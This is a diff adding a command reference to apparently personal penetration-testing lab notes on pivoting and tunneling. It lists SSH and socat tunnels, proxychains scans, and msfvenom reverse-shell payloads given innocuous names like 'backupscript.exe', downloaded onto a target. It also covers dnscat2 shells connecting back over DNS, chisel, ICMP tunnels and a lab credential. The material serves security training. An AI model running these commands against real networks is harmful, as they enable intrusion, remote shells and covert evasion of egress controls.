@@ -79,6 +79,97 @@ Network segmentation, egress filtering, no dual-homed hosts without controls, mo
 ## My notes / lab output
 Filled in as I run these on lab targets.
 
+## Full command reference (source notes)
+Complete command set — nothing trimmed.
+
+**Host / network discovery**
+| Command | Description |
+|---|---|
+| `ifconfig` / `ipconfig` | Show network config (Linux / Windows) |
+| `netstat -r` | Show the IPv4 routing table |
+| `nmap -sT -p22,3306 <ip>` | Scan a target for SSH/MySQL |
+| `for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done` | Linux ping sweep |
+| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"` | Windows ping sweep (cmd) |
+| `1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}` | PowerShell ping sweep |
+| `run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23` | MSF ping sweep via a session |
+
+**SSH tunneling**
+| Command | Description |
+|---|---|
+| `ssh -L 1234:localhost:3306 Ubuntu@<ip>` | Local port forward (:1234 → target :3306) |
+| `netstat -antp \| grep 1234` | Verify the tunnel connection |
+| `nmap -v -sV -p1234 localhost` | Scan through the local tunnel port |
+| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<ip>` | Multiple local forwards |
+| `ssh -D 9050 ubuntu@<ip>` | Dynamic port forward (SOCKS) |
+| `ssh -R <PivotIP>:8080:0.0.0.0:80 ubuntu@<ip> -vN` | Reverse SSH tunnel |
+
+**proxychains / SOCKS**
+| Command | Description |
+|---|---|
+| `tail -4 /etc/proxychains.conf` | Verify SOCKS config |
+| `socks4 127.0.0.1 9050` / `socks5 127.0.0.1 1080` | proxychains.conf lines (v4 / v5) |
+| `proxychains nmap -v -sn 172.16.5.1-200` | Nmap through the proxy (no ping) |
+| `proxychains nmap -v -Pn -sT 172.16.5.19` | TCP-connect scan through the proxy |
+| `proxychains msfconsole` | Metasploit through the proxy |
+| `proxychains xfreerdp /v:<ip> /u:victor /p:pass@123` | RDP through the proxy |
+
+**Metasploit pivoting**
+| Command | Description |
+|---|---|
+| `msfvenom -p windows/x64/meterpreter/reverse_https lhost=<PivotIP> -f exe -o backupscript.exe LPORT=8080` | Windows reverse-HTTPS payload |
+| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<AttackHost> -f elf -o backupjob LPORT=8080` | Linux reverse-TCP payload |
+| `use exploit/multi/handler` | Catch the session |
+| `scp backupscript.exe ubuntu@<ip>:~/` | Transfer the payload |
+| `python3 -m http.server 8123` | Serve a file |
+| `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"` | Download it on the target |
+| `search rdp_scanner` | Find an MSF module |
+| `use auxiliary/server/socks_proxy` → `jobs` | SOCKS proxy module / list jobs |
+| `use post/multi/manage/autoroute` | Add a route through a session |
+| `portfwd add -l 3300 -p 3389 -r <ip>` | Forward local :3300 → target :3389 |
+| `xfreerdp /v:localhost:3300 /u:victor /p:pass@123` | RDP through the forward |
+| `portfwd add -R -l 8081 -p 1234 -L <AttackHost>` | Reverse port forward |
+| `netstat -antp` | Show active connections + PIDs |
+| `bg` | Background the Meterpreter session |
+
+**socat / Windows netsh / plink**
+| Command | Description |
+|---|---|
+| `socat TCP4-LISTEN:8080,fork TCP4:<AttackHost>:80` | socat relay to attack host |
+| `socat TCP4-LISTEN:8080,fork TCP4:<target>:8443` | socat relay to target |
+| `plink -D 9050 ubuntu@<ip>` | SSH dynamic forward on Windows (PuTTY) |
+| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25` | Windows port forward |
+| `netsh.exe interface portproxy show v4tov4` | View the portproxy rule |
+
+**sshuttle / rpivot**
+| Command | Description |
+|---|---|
+| `sudo apt-get install sshuttle` | Install sshuttle |
+| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v` | Route a subnet through SSH |
+| `sudo git clone https://github.com/klsecservices/rpivot.git` | Clone rpivot |
+| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` | Run rpivot server |
+| `scp -r rpivot ubuntu@<ip>` | Copy rpivot to target |
+| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999` | Run rpivot client |
+| `proxychains firefox-esr <webserver>:80` | Browse through the SOCKS proxy |
+| `python client.py --server-ip <ip> --server-port 8080 --ntlm-proxy-ip <ip> --ntlm-proxy-port 8081 --domain <d> --username <u> --password <p>` | rpivot through an NTLM HTTP-proxy |
+
+**dnscat2 / chisel / ptunnel-ng / SocksOverRDP**
+| Command | Description |
+|---|---|
+| `git clone https://github.com/iagox86/dnscat2.git` | Clone dnscat2 |
+| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache` | Start dnscat2 server |
+| `git clone https://github.com/lukebaggett/dnscat2-powershell.git` | Clone the PS client |
+| `Import-Module dnscat2.ps1` | Import the client |
+| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <secret> -Exec cmd` | Connect back to the server |
+| `dnscat2> ?` / `dnscat2> window -i 1` | List options / interact with a session |
+| `./chisel server -v -p 1234 --socks5` | Start a chisel SOCKS server |
+| `./chisel client -v 10.129.202.64:1234 socks` | Connect a chisel client |
+| `git clone https://github.com/utoni/ptunnel-ng.git` → `sudo ./autogen.sh` | Clone + build ptunnel-ng |
+| `sudo ./ptunnel-ng -r10.129.202.64 -R22` | Start ptunnel-ng server |
+| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22` | Connect ptunnel-ng client |
+| `ssh -p2222 -lubuntu 127.0.0.1` | SSH through the ICMP tunnel |
+| `regsvr32.exe SocksOverRDP-Plugin.dll` | Register SocksOverRDP plugin |
+| `netstat -antb \| findstr 1080` | Confirm SocksOverRDP listener |
+
 ## 2. Setup
 - Attack box: (Pwnbox / Kali VM)
 - Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)
